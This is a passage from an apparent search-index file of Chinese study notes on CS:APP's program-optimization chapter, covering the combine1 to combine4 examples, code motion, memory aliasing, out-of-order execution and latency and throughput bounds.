\u200b\u5bf9\u4e8e\u200b\u4e00\u4e2a\u200b\u8fd0\u884c\u200b\u65f6\u95f4\u200b\u662f\u200b an+b \u200b\u4e2a\u200b\u5468\u671f\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u6765\u8bf4\u200b(n\u200b\u4e3a\u200b\u8f93\u5165\u200b\u6570\u636e\u91cf\u200b), \u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b CPE \u200b\u5c31\u662f\u200b a.</p>"},{"location":"notes/ICS/Chapter%2005%20Optimization/#53","title":"5.3 \u200b\u7a0b\u5e8f\u200b\u793a\u4f8b","text":"<p>\u200b\u63a5\u4e0b\u6765\u200b\u6211\u4eec\u200b\u4f1a\u200b\u901a\u8fc7\u200b\u4e00\u6b65\u6b65\u200b\u4f18\u5316\u200b\u4e00\u4e2a\u200b\u7a0b\u5e8f\u200b\u5b66\u4e60\u200b\u5982\u4f55\u200b\u4f18\u5316\u200b.</p> <p>\u200b\u6211\u4eec\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u6709\u200b\u4e00\u4e9b\u200b\u57fa\u672c\u200b\u7684\u200b\u8bbe\u7f6e\u200b:</p> C<pre><code>typedef struct {\n    long len;\n    data_t *data;\n} vec_rec, *vec_ptr;\n</code></pre> <p>data_t \u200b\u53ef\u4ee5\u200b\u662f\u200b int, long, float, double.</p> <p>\u200b\u8fd8\u6709\u200b\u4e00\u4e9b\u200b\u751f\u6210\u200b\u5411\u91cf\u200b, \u200b\u8bbf\u95ee\u200b\u5143\u7d20\u200b, \u200b\u786e\u5b9a\u200b\u957f\u5ea6\u200b\u7684\u200b\u57fa\u672c\u200b\u8fc7\u7a0b\u200b</p> C<pre><code>vec_ptr new_vec(long len) {\n    ...\n}\n\nint get_vec_element(vec_ptr v, long index, data_t *dest) {\n    if (index &lt; 0 || index &gt;= v-&gt;len)\n      return 0;\n    *dest = v-&gt;data[index];\n    return 1;\n}\n\nlong vec_length(vec_ptr v) {\n    return v-&gt;len;\n}\n</code></pre> <p>\u200b\u6211\u4eec\u200b\u7684\u200b\u793a\u4f8b\u200b\u4ee3\u7801\u200b\u5982\u4e0b\u200b:</p> C<pre><code>void combine1(vec_ptr v, data_t *dest) {\n    long i;\n\n    *dest = IDENT;\n    for (i = 0; i &lt; vec_length(v); i++) {\n        data_t val;\n        get_vec_element(v, i, &amp;val);\n        *dest = *dest OP val;\n    }\n}\n</code></pre> <p>\u200b\u5982\u679c\u200b\u662f\u200b\u6c42\u548c\u200b, \u200b\u4f7f\u7528\u200b C<pre><code>#define IDENT 0\n#define OP +\n</code></pre></p> <p>\u200b\u5982\u679c\u200b\u662f\u200b\u6c42\u79ef\u200b, \u200b\u4f7f\u7528\u200b C<pre><code>#define IDENT 1\n#define OP **\n</code></pre></p> <p></p>"},{"location":"notes/ICS/Chapter%2005%20Optimization/#54","title":"5.4 \u200b\u6d88\u9664\u200b\u5faa\u73af\u200b\u7684\u200b\u4f4e\u6548\u7387","text":"<p>combine1 \u200b\u6bcf\u6b21\u200b\u90fd\u200b\u8c03\u7528\u200b\u4e86\u200b vec_length, \u200b\u5411\u91cf\u200b\u957f\u5ea6\u200b\u4e0d\u4f1a\u200b\u53d8\u200b, \u200b\u6240\u4ee5\u200b\u53ef\u4ee5\u200b\u53ea\u200b\u8c03\u7528\u200b\u4e00\u6b21\u200b. \u200b\u4e8e\u662f\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b combine2</p> C<pre><code>void combine2(vec_ptr v, data_t *dest) {\n    long i;\n    long length = vec_legnth(v);\n\n    *dest = IDENT;\n    for (i = 0; i &lt; length; i++) {\n        data_t val;\n        get_vec_element(v, i, &amp;val);\n        *dest = *dest OP val;\n    }\n}\n</code></pre> <p></p> <p>\u200b\u8fd9\u79cd\u200b\u4f18\u5316\u200b\u79f0\u4e3a\u200b\u4ee3\u7801\u79fb\u52a8\u200b, \u200b\u901a\u8fc7\u200b\u8bc6\u522b\u200b\u8981\u200b\u6267\u884c\u200b\u591a\u6b21\u200b\u4f46\u200b\u7ed3\u679c\u200b\u4e0d\u53d8\u200b\u7684\u200b\u8ba1\u7b97\u200b, \u200b\u5c06\u200b\u8ba1\u7b97\u200b\u79fb\u200b\u5230\u200b\u524d\u9762\u200b\u4e0d\u4f1a\u200b\u591a\u6b21\u200b\u6c42\u503c\u200b\u7684\u200b\u90e8\u5206\u200b. \u200b\u4f46\u662f\u200b\u6b63\u5982\u200b\u524d\u9762\u200b\u63d0\u5230\u200b\u7684\u200b\u51fd\u6570\u200b\u7684\u200b\u526f\u4f5c\u7528\u200b, \u200b\u7f16\u8bd1\u5668\u200b\u4e0d\u4f1a\u200b\u8f7b\u6613\u200b\u5730\u200b\u6267\u884c\u200b\u8fd9\u79cd\u200b\u4f18\u5316\u200b, \u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u7a0b\u5e8f\u5458\u200b\u624b\u52a8\u200b\u8fdb\u884c\u200b.</p>"},{"location":"notes/ICS/Chapter%2005%20Optimization/#55","title":"5.5 \u200b\u51cf\u5c11\u200b\u8fc7\u7a0b\u200b\u8c03\u7528","text":"<p>\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\u5bf9\u200b v \u200b\u7684\u200b\u4efb\u610f\u200b\u7d22\u5f15\u200b\u7684\u200b\u8bbf\u95ee\u200b\u5176\u5b9e\u200b\u90fd\u200b\u662f\u200b\u5408\u6cd5\u200b\u7684\u200b, \u200b\u6240\u4ee5\u200b\u5916\u9762\u200b\u53ef\u4ee5\u200b\u4e0d\u200b\u9700\u8981\u200b\u6267\u884c\u200b\u8fb9\u754c\u200b\u68c0\u67e5\u200b. \u200b\u56e0\u6b64\u200b\u6211\u4eec\u200b\u7528\u200b\u4e00\u4e2a\u200b get_vec_start \u200b\u83b7\u53d6\u200b\u6570\u7ec4\u200b\u7684\u200b\u8d77\u59cb\u200b\u5730\u5740\u200b, \u200b\u7136\u540e\u200b\u76f4\u63a5\u200b\u8bbf\u95ee\u200b\u6570\u7ec4\u200b.</p> C<pre><code>data_t *get_vec_start(vec_ptr v) {\n    return v-&gt;data;\n}\n\nvoid combine3(vec_ptr v, data_t *dest) {\n    long i;\n    long length = vec_legnth(v);\n    data_t *data = get_vec_start(v);\n\n    *dest = IDENT;\n    for (i = 0; i &lt; length; i++) {\n        *dest = *dest OP data[i];\n    }\n}\n</code></pre> <p></p> <p>\u200b\u4ee4\u4eba\u5403\u60ca\u200b\u7684\u200b\u662f\u200b, \u200b\u6027\u80fd\u200b\u6ca1\u6709\u200b\u660e\u663e\u200b\u63d0\u5347\u200b, \u200b\u4e8b\u5b9e\u4e0a\u200b\u8fd8\u200b\u7565\u6709\u200b\u4e0b\u964d\u200b. \u200b\u663e\u7136\u200b, \u200b\u5176\u4ed6\u200b\u64cd\u4f5c\u200b\u5f62\u6210\u200b\u4e86\u200b\u74f6\u9888\u200b. \u200b\u6211\u4eec\u200b\u4f1a\u200b\u5728\u200b\u540e\u9762\u200b\u518d\u200b\u56de\u5230\u200b\u8fd9\u4e2a\u200b\u51fd\u6570\u200b.</p>"},{"location":"notes/ICS/Chapter%2005%20Optimization/#56","title":"5.6 \u200b\u6d88\u9664\u200b\u4e0d\u5fc5\u8981\u200b\u7684\u200b\u5185\u5b58\u200b\u5f15\u7528","text":"<p>\u200b\u6211\u4eec\u200b\u53d1\u73b0\u200b\u6bcf\u6b21\u200b\u5faa\u73af\u200b\u90fd\u200b\u8981\u200b\u5bf9\u200b dest \u200b\u5bfb\u5740\u200b, \u200b\u53ef\u4ee5\u200b\u7528\u200b\u4e00\u4e2a\u200b\u7d2f\u79ef\u200b\u53d8\u91cf\u200b acc \u200b\u66ff\u6362\u200b, \u200b\u8fd9\u6837\u200b\u6bcf\u6b21\u200b\u5faa\u73af\u200b\u5c31\u200b\u4ece\u200b\u4e24\u6b21\u200b\u8bfb\u200b\u4e00\u6b21\u200b\u5199\u200b\u53d8\u6210\u200b\u4e86\u200b\u4e00\u6b21\u200b\u8bfb\u200b.</p> C<pre><code>void combine4(vec_ptr v, data_t *dest) {\n    long i;\n    long length = vec_legnth(v);\n    data_t *data = get_vec_start(v);\n    data_t acc = IDENT;\n\n    for (i = 0; i &lt; length; i++) {\n        acc = acc OP data[i];\n    }\n    *dest = acc;\n}\n</code></pre> <p></p> <p>\u200b\u7531\u4e8e\u200b\u5185\u5b58\u200b\u522b\u540d\u200b\u7684\u200b\u5b58\u5728\u200b, \u200b\u7f16\u8bd1\u5668\u200b\u4e0d\u4f1a\u200b\u8f7b\u6613\u200b\u6267\u884c\u200b\u8fd9\u6837\u200b\u7684\u200b\u4f18\u5316\u200b, \u200b\u56e0\u4e3a\u200b\u5bf9\u200b dest \u200b\u4f4d\u7f6e\u200b\u6570\u636e\u200b\u7684\u200b\u66f4\u6539\u200b\u53ef\u80fd\u200b\u5bfc\u81f4\u200b data[i] \u200b\u53d1\u751f\u53d8\u5316\u200b. (\u200b\u6bd4\u5982\u200b\u4ee4\u200b dest=get_vec_start(v)+2)</p>"},{"location":"notes/ICS/Chapter%2005%20Optimization/#57","title":"5.7 \u200b\u7406\u89e3\u200b\u73b0\u4ee3\u200b\u5904\u7406\u5668","text":"<p>\u200b\u5728\u200b\u4ee3\u7801\u200b\u7ea7\u200b\u4e0a\u200b, \u200b\u770b\u4e0a\u53bb\u200b\u662f\u200b\u4e00\u6b21\u200b\u6267\u884c\u200b\u4e00\u4e2a\u200b\u6307\u4ee4\u200b, \u200b\u4f46\u662f\u200b\u5b9e\u9645\u200b\u7684\u200b\u5904\u7406\u5668\u200b\u4e2d\u662f\u200b\u540c\u65f6\u200b\u5bf9\u200b\u591a\u6761\u200b\u6307\u4ee4\u200b\u6c42\u503c\u200b\u7684\u200b, \u200b\u8fd9\u200b\u88ab\u200b\u79f0\u4e3a\u200b\u6307\u4ee4\u200b\u7ea7\u200b\u5e76\u884c\u200b. \u200b\u5728\u200b\u67d0\u4e9b\u200b\u8bbe\u8ba1\u200b\u4e2d\u200b, \u200b\u53ef\u4ee5\u200b\u6709\u200b 100 \u200b\u6216\u200b\u66f4\u200b\u591a\u6761\u200b\u6307\u4ee4\u200b\u5728\u200b\u5904\u7406\u200b\u4e2d\u200b. \u200b\u901a\u8fc7\u200b\u4e00\u4e9b\u200b\u7cbe\u7ec6\u200b\u7684\u200b\u673a\u5236\u200b\u786e\u4fdd\u200b\u8fd9\u79cd\u200b\u5e76\u884c\u6267\u884c\u200b\u7684\u200b\u884c\u4e3a\u200b\u53ef\u4ee5\u200b\u53d6\u5f97\u200b\u673a\u5668\u200b\u7ea7\u200b\u7a0b\u5e8f\u200b\u987a\u5e8f\u200b\u6267\u884c\u200b\u7684\u200b\u7ed3\u679c\u200b. \u200b\u8fd9\u200b\u4e5f\u200b\u88ab\u200b\u79f0\u4e3a\u200b\u4e71\u5e8f\u6267\u884c\u200b\u6280\u672f\u200b.</p> <p>\u200b\u6709\u200b\u4e24\u79cd\u200b\u4e0b\u754c\u200b\u63cf\u8ff0\u200b\u4e86\u200b\u7a0b\u5e8f\u200b\u7684\u200b\u6700\u5927\u200b\u6027\u80fd\u200b, \u200b\u5f53\u200b\u4e00\u7cfb\u5217\u200b\u64cd\u4f5c\u200b\u5fc5\u987b\u200b\u6309\u7167\u200b\u4e25\u683c\u200b\u987a\u5e8f\u200b\u6267\u884c\u200b\u65f6\u200b, \u200b\u5c31\u200b\u4f1a\u200b\u9047\u5230\u200b\u5ef6\u8fdf\u200b\u754c\u9650\u200b(latency bound), \u200b\u56e0\u4e3a\u200b\u4e0b\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u5fc5\u987b\u200b\u7b49\u200b\u4e0a\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u6267\u884c\u200b\u5b8c\u200b. \u200b\u541e\u5410\u91cf\u200b\u754c\u9650\u200b\u523b\u753b\u200b\u4e86\u200b\u5904\u7406\u5668\u200b\u529f\u80fd\u200b\u5355\u5143\u200b\u7684\u200b\u539f\u59cb\u200b\u8ba1\u7b97\u80fd\u529b\u200b, \u200b\u8fd9\u662f\u200b\u7a0b\u5e8f\u200b\u6027\u80fd\u200b\u7684\u200b\u7ec8\u6781\u200b\u9650\u5236\u200b.</p>"},{"location":"notes/ICS/Chapter%2005%20Optimization/#571","title":"5.7.1 \u200b\u6574\u4f53\u200b\u64cd\u4f5c","text":"<p>\u200b\u6307\u4ee4\u200b\u63a7\u5236\u200b\u5355\u5143\u200b: \u200b\u8d1f\u8d23\u200b\u4ece\u200b\u5185\u5b58\u200b\u8bfb\u200b\u6307\u4ee4\u200b, \u200b\u7136\u540e\u200b\u751f\u6210\u200b\u4e00\u7cfb\u5217\u200b\u57fa\u672c\u64cd\u4f5c\u200b</p> <p>\u200b\u6267\u884c\u200b\u5355\u5143\u200b: \u200b\u6267\u884c\u200b\u8fd9\u4e9b\u200b\u64cd\u4f5c\u200b.</p> <p>\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u53ef\u80fd\u200b\u88ab\u200b\u8f6c\u5316\u200b\u4e3a\u200b\u591a\u4e2a\u200b\u64cd\u4f5c\u200b, \u200b\u4f8b\u5982\u200b</p> Text Only<pre><code>addq %rax, 8(%rdx)\n</code></pre> <p>\u200b\u5c31\u200b\u4f1a\u200b\u88ab\u200b\u5206\u89e3\u6210\u200b\u4e09\u4e2a\u200b\u64cd\u4f5c\u200b: \u200b\u4ece\u200b\u5185\u5b58\u200b\u52a0\u8f7d\u200b\u4e00\u4e2a\u200b\u503c\u5230\u200b\u5904\u7406\u5668\u200b, \u200b\u64cd\u4f5c\u200b\u52a0\u8f7d\u200b\u8fdb\u6765\u200b\u7684\u200b\u503c\u200b\u52a0\u4e0a\u200b %rax \u200b\u7684\u200b\u503c\u200b, \u200b\u5c06\u200b\u7ed3\u679c\u200b\u5b58\u653e\u200b\u56de\u200b\u5185\u5b58\u200b. \u200b\u786c\u4ef6\u200b\u5355\u5143\u200b\u53ef\u4ee5\u200b\u5e76\u884c\u200b\u5730\u200b\u6267\u884c\u200b\u591a\u6761\u200b\u6307\u4ee4\u200b\u7684\u200b\u4e0d\u540c\u200b\u90e8\u5206\u200b.</p> <p>EU \u200b\u63a5\u53d7\u200b\u53d6\u6307\u200b\u5355\u5143\u200b\u53d1\u9001\u200b\u8fc7\u6765\u200b\u7684\u200b\u64cd\u4f5c\u200b, \u200b\u8fd9\u4e9b\u200b\u64cd\u4f5c\u200b\u4f1a\u200b\u88ab\u200b\u5206\u6d3e\u200b\u5230\u200b\u4e00\u7ec4\u200b\u529f\u80fd\u200b\u5355\u5143\u200b\u4e2d\u200b, \u200b\u6bcf\u4e2a\u200b\u529f\u80fd\u200b\u5355\u5143\u200b\u4e13\u95e8\u200b\u6267\u884c\u200b\u4e0d\u540c\u200b\u7c7b\u578b\u200b\u7684\u200b\u64cd\u4f5c\u200b.</p> <p>Warning</p> <p>\u200b\u52a0\u8f7d\u200b/\u200b\u5b58\u50a8\u5355\u5143\u200b\u6709\u200b\u4e00\u4e2a\u200b\u52a0\u6cd5\u5668\u200b\u6765\u200b\u5b8c\u6210\u200b\u5730\u5740\u200b\u8ba1\u7b97\u200b, \u200b\u6240\u4ee5\u200b\u52a0\u8f7d\u200b\u5185\u5b58\u200b\u6307\u4ee4\u200b\u4e0d\u7528\u200b\u518d\u200b\u88ab\u200b\u5206\u5272\u200b\u6210\u200b\u66f4\u200b\u5c0f\u200b\u7684\u200b\u52a0\u6cd5\u200b\u6307\u4ee4\u200b\u548c\u200b\u8bfb\u200b\u6307\u4ee4\u200b.</p> <p>\u200b\u4e00\u79cd\u200b\u64cd\u4f5c\u200b\u53ef\u80fd\u200b\u6709\u200b\u591a\u4e2a\u200b\u529f\u80fd\u200b\u5355\u5143\u200b\u53ef\u4ee5\u200b\u6267\u884c\u200b, \u200b\u5229\u7528\u200b\u8fd9\u200b\u4e00\u70b9\u200b\u53ef\u4ee5\u200b\u5b9e\u73b0\u200b\u5e76\u884c\u6267\u884c\u200b.</p> <p>\u200b\u5728\u200b\u6307\u4ee4\u200b\u63a7\u5236\u200b\u5355\u5143\u200b(ICU)\u200b\u4e2d\u200b, \u200b\u9000\u5f79\u200b\u5355\u5143\u200b\u8bb0\u5f55\u200b\u6b63\u5728\u200b\u8fdb\u884c\u200b\u7684\u200b\u5904\u7406\u200b, \u200b\u5e76\u200b\u786e\u4fdd\u200b\u5b83\u200b\u9075\u5b88\u200b\u673a\u5668\u200b\u7ea7\u200b\u7a0b\u5e8f\u200b\u7684\u200b\u987a\u5e8f\u200b\u8bed\u4e49\u200b. \u200b\u7b80\u800c\u8a00\u4e4b\u200b, \u200b\u5b83\u200b\u5c31\u662f\u200b\u63a7\u5236\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u5bf9\u200b\u7a0b\u5e8f\u5458\u200b\u53ef\u89c1\u200b\u72b6\u6001\u200b\u7684\u200b\u66f4\u6539\u200b\u80fd\u5426\u200b\u751f\u6548\u200b. \u200b\u5e76\u4e14\u200b\u6309\u200b\u987a\u5e8f\u200b\u751f\u6548\u200b. \u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u628a\u200b\u4e71\u5e8f\u6267\u884c\u200b\u6280\u672f\u200b\u770b\u4f5c\u200b\u5148\u200b\u8fd0\u7b97\u200b, \u200b\u4f46\u662f\u200b\u4e0d\u200b\u5b9e\u9645\u200b\u66f4\u6539\u200b\u7a0b\u5e8f\u5458\u200b\u53ef\u89c1\u200b\u72b6\u6001\u200b, \u200b\u6700\u540e\u200b\u518d\u200b\u6309\u200b\u987a\u5e8f\u200b\u4f7f\u200b\u66f4\u6539\u200b\u751f\u6548\u200b. </p> <p>\u200b\u4e3a\u4e86\u200b\u8fd0\u7b97\u200b\u7ed3\u679c\u200b\u7684\u200b\u6b63\u786e\u6027\u200b, \u200b\u6267\u884c\u200b\u5355\u5143\u200b\u4e4b\u95f4\u200b\u53ef\u4ee5\u200b\u5f7c\u6b64\u200b\u76f8\u4e92\u200b\u53d1\u9001\u200b\u8fd0\u7b97\u200b\u7ed3\u679c\u200b, \u200b\u8fd9\u200b\u5c31\u662f\u200b 4.5.5 \u200b\u8282\u4e2d\u200b\u6570\u636e\u200b\u8f6c\u53d1\u200b\u6280\u672f\u200b\u7684\u200b\u66f4\u200b\u7cbe\u7ec6\u200b\u7248\u672c\u200b.</p> <p></p> <p>\u200b\u7b80\u5355\u200b\u6765\u8bf4\u200b, \u200b\u8981\u200b\u66f4\u65b0\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u547d\u4ee4\u200b\u751f\u6210\u200b\u4e00\u4e2a\u200b\u6807\u8bb0\u200b t. \u200b\u5c06\u200b (r,t) \u200b\u52a0\u5165\u200b\u8868\u4e2d\u200b. \u200b\u901a\u8fc7\u200b\u8ba1\u7b97\u200b\u5f97\u5230\u200b r \u200b\u7684\u200b\u65b0\u503c\u200b v, \u200b\u751f\u6210\u200b\u7ed3\u679c\u200b (v,t). \u200b\u540e\u9762\u200b\u6240\u6709\u200b\u9700\u8981\u200b r \u200b\u7684\u200b\u6307\u4ee4\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u6839\u636e\u200b (r,t) \u200b\u8868\u4e2d\u200b\u7684\u200b t \u200b\u627e\u5230\u200b (v,t) \u200b\u4e2d\u200b\u7684\u200b v. \u200b\u5982\u679c\u200b\u8868\u4e2d\u200b\u6ca1\u6709\u200b\u6761\u76ee\u200b\u8bf4\u660e\u200b\u6ca1\u6709\u200b\u672a\u200b\u751f\u6548\u200b\u7684\u200b\u5199\u200b\u5bc4\u5b58\u5668\u200b\u64cd\u4f5c\u200b, \u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u8bfb\u200b\u5bc4\u5b58\u5668\u200b.</p>"},{"location":"notes/ICS/Chapter%2005%20Optimization/#572","title":"5.7.2 \u200b\u529f\u80fd\u200b\u5355\u5143\u200b\u7684\u200b\u6027\u80fd","text":"<p>\u200b\u6574\u6570\u200b\u548c\u200b\u6d6e\u70b9\u6570\u200b\u7684\u200b\u52a0\u6cd5\u200b\u4e58\u6cd5\u200b\u7684\u200b\u53d1\u5c04\u200b\u65f6\u95f4\u200b\u90fd\u200b\u4e3a\u200b 1, \u200b\u8bf4\u660e\u200b\u5728\u200b\u6bcf\u4e2a\u200b\u65f6\u949f\u200b\u5468\u671f\u200b\u5904\u7406\u5668\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u5f00\u59cb\u200b\u4e00\u6761\u200b\u65b0\u200b\u7684\u200b\u8fd9\u200b\u4e00\u200b\u7684\u200b\u8fd0\u884c\u200b. \u200b\u53d1\u5c04\u200b\u65f6\u95f4\u200b\u4e3a\u200b 1 \u200b\u7684\u200b\u529f\u80fd\u200b\u5355\u5143\u200b\u79f0\u4e3a\u200b\u5b8c\u5168\u200b\u6d41\u6c34\u7ebf\u200b\u5316\u200b\u7684\u200b.</p> <p>\u200b\u8868\u8fbe\u200b\u53d1\u5c04\u200b\u65f6\u95f4\u200b\u8fd8\u200b\u80fd\u200b\u7528\u200b\u529f\u80fd\u200b\u5355\u5143\u200b\u7684\u200b\u6700\u5927\u200b\u541e\u5410\u91cf\u200b\u8868\u793a\u200b, \u200b\u5b83\u200b\u5b9a\u4e49\u200b\u4e3a\u200b\u53d1\u5c04\u200b\u65f6\u95f4\u200b\u7684\u200b\u5012\u6570\u200b. (\u200b\u6bcf\u200b\u65f6\u949f\u200b\u5468\u671f\u200b\u6700\u200b\u591a\u200b\u6267\u884c\u200b\u51e0\u6761\u200b\u6307\u4ee4\u200b)</p> <p>\u200b\u5bf9\u4e8e\u200b\u4e00\u4e2a\u200b\u5bb9\u91cf\u200b\u4e3a\u200b C, \u200b\u53d1\u5c04\u200b\u65f6\u95f4\u200b\u4e3a\u200b I \u200b\u7684\u200b\u64cd\u4f5c\u200b, \u200b\u5904\u7406\u5668\u200b\u53ef\u80fd\u200b\u83b7\u5f97\u200b\u7684\u200b\u541e\u5410\u91cf\u200b\u4e3a\u200b\u6bcf\u200b\u65f6\u949f\u200b\u5468\u671f\u200b C/I \u200b\u6761\u200b\u6307\u4ee4\u200b.</p> <p>\u200b\u6839\u636e\u200b\u8fd9\u4e9b\u200b\u6570\u636e\u200b, \u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u67d0\u4e2a\u200b\u64cd\u4f5c\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u754c\u9650\u200b\u548c\u200b\u541e\u5410\u91cf\u200b\u754c\u9650\u200b, \u200b\u8868\u200b\u91cc\u9762\u200b\u7684\u200b\u662f\u200b CPE \u200b\u503c\u200b. </p> <p>\u200b\u6ce8\u610f\u200b, \u200b\u867d\u7136\u200b\u6709\u200b 4 \u200b\u4e2a\u200b\u52a0\u6cd5\u200b\u529f\u80fd\u200b\u5355\u5143\u200b\u800c\u4e14\u200b\u52a0\u6cd5\u200b\u7684\u200b\u53d1\u5c04\u200b\u65f6\u95f4\u200b\u4e3a\u200b 1, \u200b\u7406\u8bba\u200b\u4e0a\u200b\u53ef\u4ee5\u200b\u8fbe\u5230\u200b 1/4=0.25 CPE(\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u90fd\u200b\u6709\u200b 4 \u200b\u6761\u200b\u52a0\u6cd5\u200b\u6307\u4ee4\u200b\u6267\u884c\u200b, \u200b\u5e73\u5747\u200b\u4e00\u4e2a\u200b\u6307\u4ee4\u200b\u53ea\u200b\u9700\u8981\u200b 0.25 \u200b\u5468\u671f\u200b), \u200b\u4f46\u662f\u200b\u7531\u4e8e\u200b\u9700\u8981\u200b\u4ece\u200b\u5185\u5b58\u200b\u8bfb\u6570\u636e\u200b, \u200b\u5c31\u200b\u9020\u6210\u200b\u4e86\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u541e\u5410\u91cf\u200b\u754c\u9650\u200b. \u200b\u4e24\u4e2a\u200b\u52a0\u8f7d\u200b\u5355\u5143\u200b\u9650\u5236\u200b\u4e86\u200b\u5904\u7406\u5668\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u53ea\u80fd\u200b\u6700\u200b\u591a\u200b\u8bfb\u53d6\u200b\u4e24\u4e2a\u200b\u6570\u636e\u200b\u503c\u200b, \u200b\u4f7f\u5f97\u200b\u541e\u5410\u91cf\u200b\u754c\u9650\u200b\u4e3a\u200b 0.50.</p>"},{"location":"notes/ICS/Chapter%2005%20Optimization/#573","title":"5.7.3 \u200b\u5904\u7406\u5668\u200b\u64cd\u4f5c\u200b\u7684\u200b\u62bd\u8c61\u200b\u6a21\u578b","text":"<p>\u200b\u56de\u5fc6\u200b\u4e00\u4e0b\u200b combine4, \u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u9664\u4e86\u200b\u6574\u6570\u200b\u52a0\u6cd5\u200b\u5176\u4ed6\u200b\u64cd\u4f5c\u200b\u57fa\u672c\u200b\u90fd\u200b\u8fbe\u5230\u200b\u4e86\u200b\u5ef6\u8fdf\u200b\u754c\u9650\u200b, \u200b\u8fd9\u200b\u8868\u660e\u200b\u8fd9\u4e9b\u200b\u51fd\u6570\u200b\u7684\u200b\u6027\u80fd\u200b\u662f\u200b\u7531\u200b\u6267\u884c\u200b\u7684\u200b\u6c42\u548c\u200b\u6216\u200b\u4e58\u79ef\u200b\u8fd0\u7b97\u200b\u4e3b\u5bfc\u200b\u7684\u200b, \u200b\u800c\u4e14\u200b\u8fd9\u4e9b\u200b\u64cd\u4f5c\u200b\u5fc5\u987b\u200b\u987a\u5e8f\u200b\u6267\u884c\u200b. </p> <p>\u200b\u4ece\u200b\u673a\u5668\u200b\u7ea7\u200b\u4ee3\u7801\u200b\u5230\u200b\u6570\u636e\u6d41\u200b\u56fe\u200b</p> <p>\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u628a\u200b\u673a\u5668\u200b\u7ea7\u200b\u4ee3\u7801\u200b\u5212\u5206\u200b\u4e3a\u200b\u51e0\u4e2a\u200b\u57fa\u672c\u64cd\u4f5c\u200b, \u200b\u7136\u540e\u200b\u89c2\u5bdf\u200b\u8fd9\u200b\u4e4b\u95f4\u200b\u7684\u200b\u6570\u636e\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b, \u200b\u4ee5\u200b combine4 \u200b\u4e3a\u4f8b\u200b.</p> <p></p> <p>\u200b\u8fd9\u91cc\u200b vmulsd \u200b\u4f1a\u200b\u88ab\u200b\u5206\u89e3\u200b\u4e3a\u200b load + mul \u200b\u64cd\u4f5c\u200b, \u200b\u4e8e\u662f\u200b\u6211\u4eec\u200b\u5f97\u5230\u200b\u4e86\u200b\u5982\u4e0b\u200b\u6570\u636e\u6d41\u200b\u56fe\u200b</p> <p></p> <p>\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u5c06\u200b\u8bbf\u95ee\u200b\u5230\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5206\u4e3a\u200b 4 \u200b\u7c7b\u200b:</p> <ul> <li>\u200b\u53ea\u8bfb\u200b: \u200b\u53ea\u200b\u7528\u4f5c\u200b\u6e90\u503c\u200b, \u200b\u4e0d\u200b\u88ab\u200b\u4fee\u6539\u200b, \u200b\u5982\u200b %rax</li> <li>\u200b\u53ea\u200b\u5199\u200b: \u200b\u53ea\u200b\u7528\u4f5c\u200b\u76ee\u7684\u200b, \u200b\u672c\u4f8b\u200b\u4e2d\u200b\u6ca1\u6709\u200b\u8fd9\u6837\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b</li> <li>\u200b\u5c40\u90e8\u200b: \u200b\u5728\u200b\u5faa\u73af\u200b\u5185\u90e8\u200b\u4fee\u6539\u200b\u548c\u200b\u4f7f\u7528\u200b, \u200b\u4f46\u200b\u8fed\u4ee3\u200b\u548c\u200b\u8fed\u4ee3\u200b\u4e4b\u95f4\u200b\u4e0d\u200b\u76f8\u5173\u200b, \u200b\u4f8b\u5982\u200b\u6761\u4ef6\u200b\u7801\u200b\u5bc4\u5b58\u5668\u200b. \u200b\u4e0b\u200b\u4e00\u6b21\u200b\u8fed\u4ee3\u200b\u4e0d\u200b\u9700\u8981\u200b\u4e0a\u200b\u4e00\u6b21\u200b\u7684\u200b\u6761\u4ef6\u200b\u7801\u200b\u5bc4\u5b58\u5668\u200b.</li> <li>\u200b\u5faa\u73af\u200b: \u200b\u8fd9\u4e9b\u200b\u5bc4\u5b58\u5668\u200b\u65e2\u200b\u88ab\u200b\u4f7f\u7528\u200b\u53c8\u200b\u88ab\u200b\u4fee\u6539\u200b, \u200b\u4f8b\u5982\u200b %rdx, %xmm0.</li> </ul> <p>\u200b\u5faa\u73af\u200b\u5bc4\u5b58\u5668\u200b\u4e4b\u95f4\u200b\u7684\u200b\u64cd\u4f5c\u200b\u94fe\u200b\u51b3\u5b9a\u200b\u4e86\u200b\u9650\u5236\u200b\u6027\u80fd\u200b\u7684\u200b\u6570\u636e\u200b\u76f8\u5173\u200b.</p> <p>\u200b\u901a\u8fc7\u200b\u53bb\u9664\u200b\u65e0\u5173\u200b\u7684\u200b\u53d8\u91cf\u200b, \u200b\u4fdd\u7559\u200b\u6570\u636e\u200b\u4f9d\u8d56\u200b, \u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u4e00\u5f20\u200b\u66f4\u52a0\u200b\u7b80\u6d01\u200b\u7684\u200b\u6570\u636e\u6d41\u200b\u56fe\u200b.</p> <p></p> <p></p> <p>\u200b\u7b80\u5355\u200b\u7684\u200b\u91cd\u590d\u200b\u5b83\u200b n \u200b\u6b21\u200b, 